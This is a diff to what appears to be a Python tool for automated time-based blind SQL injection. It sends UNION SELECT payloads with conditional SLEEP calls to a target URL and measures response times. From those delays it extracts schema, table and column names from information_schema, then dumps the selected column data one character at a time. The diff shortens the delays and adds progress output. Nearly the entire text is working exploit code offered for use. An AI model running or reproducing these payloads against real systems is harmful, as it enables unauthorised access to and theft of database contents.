@@ -38,7 +38,6 @@ FONDO_BLANCO = '\033[47m'
 RESET = '\033[0m'
 
 caracteres = string.printable
-comilla='\''
 
 def getARG():
     parser = argparse.ArgumentParser()
@@ -54,19 +53,19 @@ def getStringSize(column_name,from_where,addwhere,where,where2):
     leng=0
     while flag:
         if addwhere == 1:
-            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(5) ELSE sleep(0) END -- -"
+            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
         elif addwhere == 2:
-            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(5) ELSE sleep(0) END -- -"
+            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
         elif addwhere == 3:
-            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({f',{comilla}:{comilla},'.join([f'{i}' for i in column_name])}) FROM {from_where}))={i} THEN sleep(5) ELSE sleep(0) END -- -"
+            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({f',0x3a,'.join([f'{i}' for i in column_name])}) FROM {from_where}))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
         else:
-            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where}))={i} THEN sleep(5) ELSE sleep(0) END -- -"
+            payload = f"' UNION SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where}))={i} THEN sleep(0.45) ELSE sleep(0) END -- -"
         url=url_W_GET_PARAM+payload
         tiempoi = time.time()
         r = requests.get(url)
         tiempol = time.time()
         tiempot = tiempol - tiempoi
-        if tiempot >= 3:
+        if tiempot >= 0.45:
             leng=i
             print(f"{AZUL}[{RESET}{CIAN}+{RESET}{AZUL}]{RESET} {BLANCO}String length{RESET}{AZUL} : {RESET}{BLANCO}{i}, now lets dump it....{RESET}")
             flag=0
@@ -77,33 +76,42 @@ def getStringSize(column_name,from_where,addwhere,where,where2):
 def getSchemas(url, chrs):
     schemas=""
     leng=getStringSize("schema_name","information_schema.schemata",0,"","")
+    p2=log.progress("SQLI")
+    p2.status("Starting attack ...")
+    time.sleep(2)
     progreso = log.progress("SCHEMAS -> ")
     for i in range(1,leng+1):
         for j in chrs:
-            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(schema_name) from information_schema.schemata), {i}, 1)) = {ord(j)} THEN SLEEP(3) ELSE NULL end -- -"
+            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(schema_name) from information_schema.schemata), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
             url=url_W_GET_PARAM+payload
+            p2.status(url)
             tiempoi = time.time()
             r = requests.get(url)
             tiempol = time.time()
             tiempot = tiempol - tiempoi
-            if tiempot >= 3:
+            if tiempot >= 0.5:
                 schemas+=j
                 progreso.status(schemas)
+                break
     return schemas
 
 def getTables(url, chrs, schema):
     tables=""
     leng=getStringSize("table_name","information_schema.tables",1,schema,"")
+    p2=log.progress("SQLI")
+    p2.status("Starting attack ...")
+    time.sleep(2)
     progreso = log.progress("TABLES -> ")
     for i in range(1,leng+1):
         for j in chrs:
-            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema = '{schema}'), {i}, 1)) = {ord(j)} THEN SLEEP(3) ELSE NULL end -- -"
+            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema = '{schema}'), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
             url=url_W_GET_PARAM+payload
+            p2.status(url)
             tiempoi = time.time()
             r = requests.get(url)
             tiempol = time.time()
             tiempot = tiempol - tiempoi
-            if tiempot >= 3:
+            if tiempot >= 0.5:
                 tables+=j
                 progreso.status(tables)
     return tables
@@ -111,16 +119,20 @@ def getTables(url, chrs, schema):
 def getColumns(url,chrs,schema,table):
     columns=""
     leng=getStringSize("column_name","information_schema.columns",2,schema,table)
+    p2=log.progress("SQLI")
+    p2.status("Starting attack ...")
+    time.sleep(2)
     progreso = log.progress("COLUMNS -> ")
     for i in range(1,leng+1):
         for j in chrs:
-            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(column_name) from information_schema.columns where table_schema = '{schema}' and table_name = '{table}'), {i}, 1)) = {ord(j)} THEN SLEEP(3) ELSE NULL end -- -"
+            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat(column_name) from information_schema.columns where table_schema = '{schema}' and table_name = '{table}'), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
             url=url_W_GET_PARAM+payload
+            p2.status(url)
             tiempoi = time.time()
             r = requests.get(url)
             tiempol = time.time()
             tiempot = tiempol - tiempoi
-            if tiempot >= 3:
+            if tiempot >= 0.5:
                 columns+=j
                 progreso.status(columns)
     return columns
@@ -128,16 +140,20 @@ def getColumns(url,chrs,schema,table):
 def dumpInfoFromCols(url,chrs,schema,table,cols):
     data=""
     leng=getStringSize(cols,f"{schema}.{table}",3,"","")
+    p2=log.progress("SQLI")
+    p2.status("Starting attack ...")
+    time.sleep(2)
     progreso = log.progress("DUMP -> ")
     for i in range(1,leng+1):
         for j in chrs:
-            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat({f',{comilla}:{comilla},'.join([f'{i}' for i in cols])}) from {schema}.{table}), {i}, 1)) = {ord(j)} THEN SLEEP(3) ELSE NULL end -- -"
+            payload=f"' UNION SELECT CASE WHEN ASCII(SUBSTRING((select group_concat({f',0x3a,'.join([f'{i}' for i in cols])}) from {schema}.{table}), {i}, 1)) = {ord(j)} THEN SLEEP(0.5) ELSE NULL end -- -"
             url=url_W_GET_PARAM+payload
+            p2.status(url)
             tiempoi = time.time()
             r = requests.get(url)
             tiempol = time.time()
             tiempot = tiempol - tiempoi
-            if tiempot >= 3:
+            if tiempot >= 0.5:
                 data+=j
                 progreso.status(data)
     return data
@@ -182,7 +198,7 @@ def columnsMenu(columns):
     while flag:
         col=int(input(f"\n{VERDE}[*]{RESET}{BLANCO} From the following columns select the one you're interested on (pick the number)\n|> {RESET}"))
         cols2look.append(list_columns[col-1])
-        cont = str(input(f"\n{AMARILLO}[?]{RESET}{BLANCO} Do you want to continue adding columns to dump? (YES/NO)\n{RESET}|>"))
+        cont = str(input(f"\n{AMARILLO}[?]{RESET}{BLANCO} Do you want to continue adding columns to dump? (YES/NO)\n{RESET}|> "))
         if cont.lower() == "no\n":
             flag=0
             break
